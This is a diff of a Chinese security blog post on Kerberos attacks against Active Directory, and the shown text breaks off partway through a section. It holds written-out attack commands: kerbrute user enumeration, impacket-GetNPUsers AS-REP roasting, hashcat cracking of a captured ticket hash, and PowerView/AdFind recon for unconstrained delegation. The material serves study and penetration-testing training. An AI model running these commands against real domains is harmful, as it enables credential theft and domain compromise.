@@ -11,7 +11,7 @@
   <meta itemprop="name" content="kerberos攻击">
   <meta itemprop="datePublished" content="2024-08-15T10:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T10:31:01+08:00">
-  <meta itemprop="wordCount" content="886">
+  <meta itemprop="wordCount" content="852">
   <meta itemprop="keywords" content="攻防,内网渗透"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/57/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="kerberos攻击">
@@ -37,7 +37,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/windows\/57\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 内网渗透","wordcount":  886 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 内网渗透","wordcount":  852 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/windows\/57\/","datePublished": "2024-08-15T10:31:01+08:00","dateModified": "2024-08-15T10:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -144,7 +144,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Kerberos攻击</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 10:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="886 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 900 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>5 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 10:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="852 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 900 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>4 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -152,50 +152,97 @@
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#spn">SPN</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#as-rep-roasting">AS-REP Roasting</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#kerberoasting">Kerberoasting</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#非约束性委派">非约束性委派</a>
       <ul>
-        <li></li>
+        <li><a href="#查找非约束委派的主机或服务账号域控默认配置非约束委派属性">查找非约束委派的主机或服务账号（域控默认配置非约束委派属性）</a></li>
+        <li><a href="#非约束性委派大致流程">非约束性委派<em>大致</em>流程</a></li>
+        <li><a href="#攻击">攻击</a></li>
+      </ul>
+    </li>
+    <li><a href="#约束型委派">约束型委派</a>
+      <ul>
+        <li><a href="#侦察方法">侦察方法</a></li>
+        <li><a href="#攻击-1">攻击</a></li>
+      </ul>
+    </li>
+    <li><a href="#基于资源的约束性委派--rbcd">基于资源的约束性委派  RBCD</a>
+      <ul>
+        <li><a href="#基于资源的约束性委派的优势">基于资源的约束性委派的优势</a></li>
+        <li><a href="#约束性委派和基于资源的约束性委派配置的差别">约束性委派和基于资源的约束性委派配置的差别</a></li>
+        <li><a href="#什么用户能够修改msds-allowedtoactonbehalfofotheridentity属性">什么用户能够修改msDS-AllowedToActOnBehalfOfOtherIdentity属性：</a></li>
+        <li><a href="#什么是将机器加入域的域用户">什么是将机器加入域的域用户？</a></li>
+        <li><a href="#攻击-2">攻击</a></li>
+      </ul>
+    </li>
+    <li><a href="#域委派防范措施">域委派防范措施</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#ms14-068">MS14-068</a>
+      <ul>
+        <li><a href="#前提">前提</a></li>
+        <li><a href="#原理">原理</a></li>
+        <li><a href="#漏洞利用">漏洞利用</a></li>
+      </ul>
+    </li>
+    <li><a href="#nopac">noPAC</a>
+      <ul>
+        <li><a href="#利用条件">利用条件</a></li>
+        <li><a href="#漏洞原理">漏洞原理</a></li>
+        <li><a href="#漏洞利用-1">漏洞利用</a></li>
       </ul>
     </li>
   </ul>
 </nav></div>
-      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="基础概念" class="heading-element"><span>0.0.0.1  基础概念</span>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="基础概念" class="heading-element"><span>基础概念</span>
   <a href="#%e5%9f%ba%e7%a1%80%e6%a6%82%e5%bf%b5" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="spn" class="heading-element"><span>0.0.0.1.1  SPN</span>
+</h1><h2 id="spn" class="heading-element"><span>SPN</span>
   <a href="#spn" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>SPN(ServicePrincipal Names)服务主体名称，是服务实例(比如：HTTP、SMB、MySQL等服务)的唯一标识符。Kerberos认证过程使用SPN将服务实例与服务登录账户相关联，如果想使用 Kerberos 协议来认证服务，那么必须正确配置SPN。</p>
+</h2><p>SPN(ServicePrincipal Names)服务主体名称，是服务实例(比如：HTTP、SMB、MySQL等服务)的唯一标识符。Kerberos认证过程使用SPN将服务实例与服务登录账户相关联，如果想使用 Kerberos 协议来认证服务，那么必须正确配置SPN。</p>
 <p>SPN分为两种类型：</p>
 <p>1.一种是注册在活动目录的机器帐户(Computers)下，当一个服务的权限为 Local System 或 Network Service，则SPN注册在机器帐户(Computers)下。</p>
 <p>2.一种是注册在活动目录的域用户帐户(Users)下，当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下。</p>
 <p>给域用户注册SPN</p>
 <p><code>setspn -U -A priv/test many</code></p>
-<h5 id="as" class="heading-element"><span>0.0.0.2  AS</span>
+<h1 id="as" class="heading-element"><span>AS</span>
   <a href="#as" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="as-rep-roasting" class="heading-element"><span>0.0.0.2.1  AS-REP Roasting</span>
+</h1><h2 id="as-rep-roasting" class="heading-element"><span>AS-REP Roasting</span>
   <a href="#as-rep-roasting" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>拿到的用户名放到kerbrute里去跑，可以得到合法用户</p>
+</h2><p>拿到的用户名放到kerbrute里去跑，可以得到合法用户</p>
 <pre tabindex="0"><code>kerbrute.exe userenum --dc 172.22.60.8 -d xiaorang.lab user.txt</code></pre><p>寻找这些用户是否开启了“不要求Kerberos预身份验证”选项</p>
 <p>AS-REP Roasting</p>
 <pre tabindex="0"><code>proxychains4 impacket-GetNPUsers -dc-ip 172.22.60.8  xiaorang.lab/ -usersfile users.txt</code></pre><p>然后得到的hash值离线爆破</p>
 <pre tabindex="0"><code>hashcat -a 0 -m 18200 --force 1.txt /usr/share/wordlists/rockyou.txt
 
-hashcat -m 18200 &#39;$krb5asrep$23$wangyun@xiaorang.lab@XIAORANG.LAB:bd4c55b9ad6dfe9588622d84ab60bad9$c246e2f76d34448d9c7dd6dec03b7333f8cb1b363b736e214e6bc717e7a6cb8d144b0bf83d0472450db307ea6d2068bbf66d77dd316cae5cb680c8dda30f4655e99dedc39b00360a43dd1db14d7322e3bb4d2a7a1fc1d8f5f2200af3a888c7d1233043ec69ff87df5aff0d4ce2e02428d4b3f921d44b7f654e7a34d671fd4d6c33cb07b58fd849ae0a9aea7e7c9419a06b3b07d844d74b2a95b14d8baf459bf9f5bea623eb4d354735e71b5a3751cf8006a7cf1b5a4e5d3f2abe7569ec5faf9401833a4b4677a395a6d931b374f0f47a380d848ceed29a414c39608188d0cdab58a13b3d1caf26c162842ce0&#39; /usr/share/wordlists/rockyou.txt --force</code></pre><h5 id="tgs" class="heading-element"><span>0.0.0.3  TGS</span>
+hashcat -m 18200 &#39;$krb5asrep$23$wangyun@xiaorang.lab@XIAORANG.LAB:bd4c55b9ad6dfe9588622d84ab60bad9$c246e2f76d34448d9c7dd6dec03b7333f8cb1b363b736e214e6bc717e7a6cb8d144b0bf83d0472450db307ea6d2068bbf66d77dd316cae5cb680c8dda30f4655e99dedc39b00360a43dd1db14d7322e3bb4d2a7a1fc1d8f5f2200af3a888c7d1233043ec69ff87df5aff0d4ce2e02428d4b3f921d44b7f654e7a34d671fd4d6c33cb07b58fd849ae0a9aea7e7c9419a06b3b07d844d74b2a95b14d8baf459bf9f5bea623eb4d354735e71b5a3751cf8006a7cf1b5a4e5d3f2abe7569ec5faf9401833a4b4677a395a6d931b374f0f47a380d848ceed29a414c39608188d0cdab58a13b3d1caf26c162842ce0&#39; /usr/share/wordlists/rockyou.txt --force</code></pre><h1 id="tgs" class="heading-element"><span>TGS</span>
   <a href="#tgs" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="kerberoasting" class="heading-element"><span>0.0.0.3.1  Kerberoasting</span>
+</h1><h2 id="kerberoasting" class="heading-element"><span>Kerberoasting</span>
   <a href="#kerberoasting" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p><a href="https://antipassion.github.io/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/"target="_blank" rel="external nofollow noopener noreferrer">https://antipassion.github.io/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/</a></p>
+</h2><p><a href="https://antipassion.github.io/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/"target="_blank" rel="external nofollow noopener noreferrer">https://antipassion.github.io/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/</a></p>
 <ul>
 <li>Kerberoasting 当域内某个用户去请求同域内的某个服务实例时，请求会首先被 送达至<strong>KDS</strong> 的 <strong>AS</strong> 中进行身份认证。</li>
 <li>通过后 <strong>AS</strong> 会返回一个由用户密码<strong>hash</strong>加密而成的<strong>TGT</strong>票据给用户，然后用户再拿着<strong>TGT</strong>票据去请求<strong>TGS</strong>，<strong>TGS</strong>验证成功后会返回一个用对应服务账号的密码<strong>hash</strong>加密过**(RC4_HMAC_MD5)<strong>的票据</strong>TGS**</li>
@@ -213,11 +260,11 @@ hashcat -m 18200 &#39;$krb5asrep$23$wangyun@xiaorang.lab@XIAORANG.LAB:bd4c55b9ad
 <li>导出TGS</li>
 <li>利用字典破解TGS拿到明文密码</li>
 </ol>
-<h5 id="委派攻击" class="heading-element"><span>0.0.0.4  委派攻击</span>
+<h1 id="委派攻击" class="heading-element"><span>委派攻击</span>
   <a href="#%e5%a7%94%e6%b4%be%e6%94%bb%e5%87%bb" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p><a href="https://xz.aliyun.com/t/11555"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/11555</a></p>
+</h1><p><a href="https://xz.aliyun.com/t/11555"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/11555</a></p>
 <p><a href="https://www.cnblogs.com/yokan/p/16164761.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/yokan/p/16164761.html</a></p>
 <p><a href="https://forum.butian.net/share/1591"target="_blank" rel="external nofollow noopener noreferrer">https://forum.butian.net/share/1591</a></p>
 <p>是将域用户的权限委派给服务账号，委派之后，服务账号就可以以域用户的身份去做域用户能够做的事</p>
@@ -227,15 +274,18 @@ hashcat -m 18200 &#39;$krb5asrep$23$wangyun@xiaorang.lab@XIAORANG.LAB:bd4c55b9ad
 <p>2、服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer，MYSQL等，还有就是域用户通过==注册SPN==也能成为服务账号。</p>
 </blockquote>
 <p>委派攻击分为非约束性委派、约束型委派、基于资源的约束性委派</p>
-<h6 id="非约束性委派" class="heading-element"><span>0.0.0.4.1  非约束性委派</span>
+<h2 id="非约束性委派" class="heading-element"><span>非约束性委派</span>
   <a href="#%e9%9d%9e%e7%ba%a6%e6%9d%9f%e6%80%a7%e5%a7%94%e6%b4%be" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p><strong>服务账号可以获取被委派用户的TGT，并将TGT缓存到LSASS进程中，从而服务账号可使用该TGT， 模拟该用户访问任意服务</strong>。非约束委派的设置需要SeEnableDelegation 特权，该特权通常仅授予域管理员 。</p>
+</h2><p><strong>服务账号可以获取被委派用户的TGT，并将TGT缓存到LSASS进程中，从而服务账号可使用该TGT， 模拟该用户访问任意服务</strong>。非约束委派的设置需要SeEnableDelegation 特权，该特权通常仅授予域管理员 。</p>
 <pre tabindex="0"><code>配置了非约束性委派属性的机器账号的userAccountControl 属性有个Flag位 WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION，其对应的数是0x81000=528384。
 
-配置了非约束性委派属性的服务账号的userAccountControl 属性有个Flag位 NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION， 其对应的数是0x80200=524800。</code></pre><p>####### 查找非约束委派的主机或服务账号（域控默认配置非约束委派属性）</p>
-<p>1、 利用powersploit中的powerview</p>
+配置了非约束性委派属性的服务账号的userAccountControl 属性有个Flag位 NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION， 其对应的数是0x80200=524800。</code></pre><h3 id="查找非约束委派的主机或服务账号域控默认配置非约束委派属性" class="heading-element"><span>查找非约束委派的主机或服务账号（域控默认配置非约束委派属性）</span>
+  <a href="#%e6%9f%a5%e6%89%be%e9%9d%9e%e7%ba%a6%e6%9d%9f%e5%a7%94%e6%b4%be%e7%9a%84%e4%b8%bb%e6%9c%ba%e6%88%96%e6%9c%8d%e5%8a%a1%e8%b4%a6%e5%8f%b7%e5%9f%9f%e6%8e%a7%e9%bb%98%e8%ae%a4%e9%85%8d%e7%bd%ae%e9%9d%9e%e7%ba%a6%e6%9d%9f%e5%a7%94%e6%b4%be%e5%b1%9e%e6%80%a7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>1、 利用powersploit中的powerview</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#58a1dd">Import</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">Module</span> .\<span style="color:#58a1dd">PowerView</span>.<span style="color:#58a1dd">ps1</span>;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>查询非约束委派的主机 <span style="color:#ff636f">Get</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">NetComputer</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">Unconstrained</span> <span style="color:#ff636f">-</span><span style="color:#ff636f">Domain</span> <span style="color:#58a1dd">yokan</span>.<span style="color:#58a1dd">com</span>
@@ -244,13 +294,22 @@ hashcat -m 18200 &#39;$krb5asrep$23$wangyun@xiaorang.lab@XIAORANG.LAB:bd4c55b9ad
 <p>查找域中配置非约束委派的用户</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-armasm" data-lang="armasm"><span style="display:flex;"><span>AdFind.exe -b &#34;DC=<span style="color:#58a1dd">yokan</span>,DC=<span style="color:#58a1dd">com</span>&#34; -f &#34;(&amp;(samAccountType=<span style="color:#58a1dd">805306368</span>)(userAccountControl:1.2.840.113556.1.4.803:=<span style="color:#58a1dd">524288</span>))&#34; cn distinguishedName</span></span></code></pre></div><p>查找域中配置非约束委派的主机</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-armasm" data-lang="armasm"><span style="display:flex;"><span>AdFind.exe -b &#34;DC=<span style="color:#58a1dd">yokan</span>,DC=<span style="color:#58a1dd">com</span>&#34; -f &#34;(&amp;(samAccountType=<span style="color:#58a1dd">805306369</span>)(userAccountControl:1.2.840.113556.1.4.803:=<span style="color:#58a1dd">524288</span>))&#34; cn distinguishedName</span></span></code></pre></div><p>3、 ldapsearch</p>
-<p>####### 非约束性委派<em>大致</em>流程</p>
-<p>user访serverA，于是向DC发起认证，DC会检查serverA的机器账号的属性，<strong>如果是非约束委派的话，会把用户的TGT放在ST票据中并一起发送给serverA</strong>，这样serverA在验证ST票据的同时也获取到了用户的TGT，并<strong>把TGT储存在自己的lsass进程中以备下次重用，从而serverA就可以使用这个TGT，来模拟这个user访问任何服务</strong>。</p>
+<h3 id="非约束性委派大致流程" class="heading-element"><span>非约束性委派<em>大致</em>流程</span>
+  <a href="#%e9%9d%9e%e7%ba%a6%e6%9d%9f%e6%80%a7%e5%a7%94%e6%b4%be%e5%a4%a7%e8%87%b4%e6%b5%81%e7%a8%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>user访serverA，于是向DC发起认证，DC会检查serverA的机器账号的属性，<strong>如果是非约束委派的话，会把用户的TGT放在ST票据中并一起发送给serverA</strong>，这样serverA在验证ST票据的同时也获取到了用户的TGT，并<strong>把TGT储存在自己的lsass进程中以备下次重用，从而serverA就可以使用这个TGT，来模拟这个user访问任何服务</strong>。</p>
 <p>从攻击角度来说：<strong>如果攻击者拿到了一台配置了非约束委派的机器权限，可以诱导管理员来访问该机器，然后可以得到管理员的TGT，从而模拟管理员访问任意服务，相当于拿下了整个域环境</strong>。</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404021651812.webp" alt="image-20240402165112651" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404021651812.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404021651812.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404021651812.webp?size=large 2x" data-title="image-20240402165112651" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>####### 攻击</p>
-<p>######## 攻击一</p>
-<pre tabindex="0"><code>用域管访问SERVER2012机器
+<h3 id="攻击" class="heading-element"><span>攻击</span>
+  <a href="#%e6%94%bb%e5%87%bb" class="heading-mark">
